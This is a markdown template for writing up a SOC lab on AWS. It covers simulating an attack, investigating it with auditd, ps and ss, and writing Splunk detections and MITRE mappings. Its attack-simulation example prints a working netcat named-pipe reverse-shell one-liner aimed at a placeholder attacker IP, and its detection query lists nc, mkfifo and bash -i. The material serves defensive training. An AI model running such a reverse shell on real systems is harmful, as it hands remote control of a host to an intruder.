# Day Title

## Objective

Describe the goal of the lab.

---

## Environment

Describe the lab setup.

Example:

- Two EC2 instances (Attacker + Target)
- Ubuntu Linux
- AWS Systems Manager (SSM) used for remote access
- `auditd` enabled for execution telemetry
- CloudTrail enabled for AWS API logging

---

## Attack Simulation

Explain what attacker activity was performed.

Include commands used during the simulation.

Example:

```bash
aws ssm start-session --target <instance-id>
whoami
hostname
```
or

```bash
mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc <attacker-ip> 4444 > /tmp/f
```

Explain what the attacker accomplished.

Example:

    This activity simulated an attacker gaining an interactive shell on the target instance.

---

## Investigation Approach

Describe how the activity was investigated.

Example investigation commands:

```bash
sudo ausearch -m EXECVE
ps -ef --forest
ss -antp
```

Explain what each command helped reveal.

Example:

- `ausearch` used to identify executed binaries
- `ps --forest` used to analyze parent-child process relationships
- `ss -antp` used to correlate active network connections

---

## Key Findings

Summarize the most important indicators discovered.

Examples:

- Outbound TCP connection to attacker IP on port 4444
- `nc` process spawned under `ssm-user`
- Named pipe created in `/tmp`
- Interactive bash shell execution

Example format:

```code
exe=/usr/bin/nc.openbsd
destination=<attacker-ip>:4444
uid=ssm-user
```

---

## Detection Signals

List the key signals a SOC could monitor.

Example:

- Execution of `nc`
- Creation of named pipes (`mkfifo`)
- Interactive `bash -i` execution
- Long-lived outbound TCP sessions
- CloudTrail `StartSession` events

Explain which signals are strong vs weak indicators.

Example:

    Single indicators are weak alone. High-confidence detection requires correlating multiple signals.

---

## Detection Example (SIEM Logic)

Provide example detection logic.

Example Splunk query:

```spl
index=cloudtrail
eventSource="ssm.amazonaws.com"
eventName="StartSession"
```

Example Linux telemetry detection:

    index=auditd
    ("mkfifo" OR "bash -i" OR "nc")

---

## MITRE ATT&CK Mapping

List the techniques demonstrated.

Example:

Technique: **T1021 – Remote Services**.   
Sub-technique: **T1021.007 – Cloud Services**

or

Technique: **T1059 – Command and Scripting Interpreter**

---

## Security Implication

Explain why this behavior is dangerous.

Example:

    Attackers may use reverse shells or cloud management interfaces to bypass traditional authentication mechanisms and maintain interactive access to compromised systems.

---

## SOC Takeaway

Write this section in your own voice.

Example:

    This exercise demonstrates the importance of correlating host telemetry, network activity, and cloud audit logs. Attackers often rely on legitimate system utilities such as bash and nc, making behavioral detection far more effective than signature-based detection.

---

## Screenshots

Place screenshots in the `screenshots/` directory.

Example references:

    Figure 1: Reverse shell listener on attacker machine.   
    Figure 2: EXECVE audit logs showing nc execution.   
    Figure 3: ESTABLISHED reverse shell session.   
    Figure 4: CloudTrail StartSession event.    

---

## Supporting Artifacts

Optional section for logs or exported evidence.

Examples:

- auditd log extracts
- CloudTrail JSON events
- network connection output